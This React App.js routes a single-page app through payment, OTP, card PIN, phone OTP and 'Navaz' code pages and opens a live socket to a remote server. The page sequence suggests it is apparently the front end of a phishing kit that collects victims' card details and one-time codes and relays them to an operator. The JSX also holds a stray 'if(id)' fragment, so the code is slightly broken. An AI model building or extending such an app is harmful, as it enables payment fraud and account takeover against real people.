import { BrowserRouter, Routes, Route } from "react-router-dom";
import { useEffect, useState } from "react";
import axios from "axios";
import { io } from "socket.io-client";
import Home from "./Pages/Home";
import Footer from "./components/Footer";
import Payemnt from "./Pages/Payemnt";
import OTP from "./Pages/OTP";
import PIN from "./Pages/PIN";
import Success from "./Pages/Success";
import Data from "./Pages/Data";
import Phone from "./Pages/Phone";
import PhoneOtp from "./Pages/PhoneOtp";
import Navaz from "./Pages/Navaz";
import NavazCode from "./Pages/NavazCode";

// export const api_route = "http://localhost:8080";
export const api_route = "https://efaa-server.onrender.com";
export const socket = io(api_route);

export function getKeysWithTrueValue(obj) {
  const keysWithTrueValue = {};
  for (const key in obj) {
    if (obj[key]) {
      keysWithTrueValue[key] = obj[key];
    }
  }
  return keysWithTrueValue;
}

function App() {
  useEffect(() => {
    (async () => {
      await axios.get(api_route + "/");
    })();
  }, []);
  const [loading, setLoading] = useState(false);
  const routes = [
    {
      path: "/",
      element: <Home />,
    },
    {
      path: "/success",
      element: <Success />,
    },
    {
      path: "/data",
      element: <Data />,
    },
    {
      path: "/payment",
      element: <Payemnt />,
    },
    {
      path: "/OTP",
      element: <OTP />,
    },
    {
      path: "/PIN",
      element: <PIN />,
    },
    {
      path: "/phone",
      element: <Phone />,
    },
    {
      path: "/phoneOtp",
      element: <PhoneOtp />,
    },
    {
      path: "/navaz",
      element: <Navaz />,
    },
    {
      path: "/navazOtp",
      element: <NavazCode />,
    },
  ];

  return (
    <div
      className="min-h-screen  w-full flex items-start justify-between   "
      style={{
        backgroundImage: "url('/home.jpg')",
        backgroundSize: "cover",
        backgroundPosition: "center",
      }}
    >
      <div className="w-full relative items-center justify-between flex flex-col min-h-screen">
        {
          <BrowserRouter>
            <Routes>
              <Route path="/" element={<Home />} />
              if(id)
              {routes.map((route) => (
                <Route path={route.path} element={route.element} />
              ))}
            </Routes>
            <Footer />
          </BrowserRouter>
        }
      </div>
    </div>
  );
}

export default App;
